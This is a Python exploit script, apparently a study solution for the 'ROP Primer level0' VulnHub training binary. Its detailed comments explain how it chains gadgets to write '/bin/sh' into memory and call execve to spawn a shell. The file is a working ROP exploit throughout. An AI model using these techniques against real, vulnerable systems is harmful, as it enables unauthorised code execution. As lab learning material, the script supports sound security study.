#!/usr/bin/env python

# Solution based on following writeup:
# http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/

# Didn't use mprotect like from following writeups as when I compiled the binary the mprotect address had a null byte
# https://blog.techorganic.com/2015/08/19/a-rop-primer-solution/
# https://g0blin.co.uk/rop-primer-0-2-vulnhub-writeup/
# http://rastamouse.me/writeups/2015/rop-primer-level-0/
# http://7rus7us.blogspot.com.au/2015/05/rop-primer-1_34.html

import struct

# find overwrite
buffer_before_eip_overwrite = "A" * 38

# find mprotect
mprotect = struct.pack("<I", 0x806df00)
# !! ends with null byte so cant rop to this address easily !!

# using execve syscall directly
# requirements: write execve arg to run somewhere, setup registers for the syscall
# execve needs to be setup as follows:
# eax = syscall number = 0x0b
# ebx = pointer to filename to execute # this will be /bin/sh which we have to write somewhere
# ecx = pointer to argv # this will be null in our case
# edx = pointer to envp # this will be null in our case

# find address to write to
# gdb-peda$ vmmap
# Start      End        Perm	Name
# 0x08048000 0x080e9000 r-xp	/home/home/code/offsec/binary_exploitation/examples/ropprimer/level0/level0
# 0x080e9000 0x080eb000 rw-p	/home/home/code/offsec/binary_exploitation/examples/ropprimer/level0/level0
# 0x080eb000 0x0810f000 rw-p	[heap]
# 0xf7ffb000 0xf7ffd000 r--p	[vvar]
# 0xf7ffd000 0xf7ffe000 r-xp	[vdso]
# 0xfffdd000 0xffffe000 rw-p	[stack]
raw_address_to_write_to = 0x080e9000 + 0x40
address_to_write_to = struct.pack("<I", raw_address_to_write_to) # note the +0x40 to avoid null byte in address (0x080e9040)

# to write the string to that address, I can use following instruction 'mov [edx], eax; ret' (move contents of eax to
# the address thats in edx. edx needs to contain the address_to_write_to, eax can only contain 4 bytes, so I need to
# write /bin first, then rop to another write of /shX, then will need to 0 out (null byte) the X at the end so
# it can be passed as a string pointer to execve

# to find instructions I can use go to http://ropshell.com
# search for 'mov [?' to find instructions that do a mov to an address
# > 0x080547fb : mov [edx], eax; ret
move_eax_to_address_of_edx = struct.pack("<I", 0x080547fb)

# to get the address_to_write_to into edx i need to search for 'pop edx'
# > 0x0806ee3a : pop edx; ret
pop_edx = struct.pack("<I", 0x0806ee3a)

# to get the string value into eax i need to search for 'pop eax'
# > 0x08056342 : pop eax; ret
pop_eax = struct.pack("<I", 0x08056342)

# to get 0 into a register search for 'xor'. xor on the same register is same as setting to 0.
# > 0x080492c3 : xor eax, eax; ret
zero_out_eax = struct.pack("<I", 0x080492c3)

payload = ""
payload += buffer_before_eip_overwrite

# put address_to_write_to into edx
payload += pop_edx
payload += address_to_write_to

# put /bin into eax
payload += pop_eax
payload += "/bin"

# move /bin (eax) to address_to_write_to (edx)
payload += move_eax_to_address_of_edx

# move /shX into eax
payload += pop_eax
payload += "/shX"

# put address to write /shX into edx (its address_to_write_to + 0x4 because /bin is the first 0x4 bytes)
payload += pop_edx
payload += struct.pack("<I", raw_address_to_write_to + 0x4)

# move /shX just past /bin at address_to_write_to
payload += move_eax_to_address_of_edx

# put 0 (null byte) into eax
payload += zero_out_eax

# put address to write the null byte into edx (its address_to_write_to + 0x7 because /bin/sh is the first 0x7 bytes)
payload += pop_edx
payload += struct.pack("<I", raw_address_to_write_to + 0x7)
payload += move_eax_to_address_of_edx

# checking address_to_write_to in gdb should show the string now:
# gdb-peda$ x/s 0x080e9040
# 0x80e9040:	"/bin/sh"

# setup execve syscall
# eax = syscall number = 0x0b
# ebx = pointer to filename to execute # this will be /bin/sh which we have to write somewhere
# ecx = pointer to argv # this will be null in our case
# edx = pointer to envp # this will be null in our case

# to get the address into ebx i need to search for 'pop ebx'
# > 0x0804f06c : pop ebx; ret
pop_ebx = struct.pack("<I", 0x0804f06c)

# to set ecx and edx to 0, cant pass null byte, so set value to 0 minus 1 (0xffffff) then add 1
# to add the 1, we search for 'inc'
# > 0x0805cf17 : inc edx; ret
# > 0x08085bf6 : inc ecx; add al, -0x77; ret
inc_edx = struct.pack("<I", 0x0805cf17)
inc_ecx_and_change_eax = struct.pack("<I", 0x08085bf6)

# set edx to 0x0 (null byte)
payload += pop_edx
payload += struct.pack("<I", 0xffffffff)
payload += inc_edx

# search for 'pop ecx' but only following is found:
# > 0x0806ee61 : pop ecx; pop ebx; ret
pop_ecx_pop_ebx = struct.pack("<I", 0x0806ee61)

# set ecx to 0x0 (null byte)
payload += pop_ecx_pop_ebx
payload += struct.pack("<I", 0xffffffff)
# put pointer to /bin/sh (address_to_write_to) into ebx from the second instruction in that rop
payload += address_to_write_to
payload += inc_ecx_and_change_eax

# put 0x0b into eax, we cant pass 0x0b on stack as it would be padded by null bytes (0x0000000b)
# search for 'inc eax'
# > 0x0807a7cf : inc eax; ret
inc_eax = struct.pack("<I", 0x0807a7cf)

# put -1 into eax
payload += pop_eax
payload += struct.pack("<I", 0xffffffff)
payload += inc_eax

# inc eax until you are at 0xb
for x in range(0, 0xb):
    payload += inc_eax

# to make a syscall we need the instruction 'int 0x80'
# search for 'int'
# > 0x0806f590 : int 0x80; ret
syscall_int = struct.pack("<I", 0x0806f590)

payload += syscall_int

# return to any address
payload += "BBBB"

print payload

# run exploit
# "The extra cat is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell."
# $ (python exploit.py; cat) | ./level0

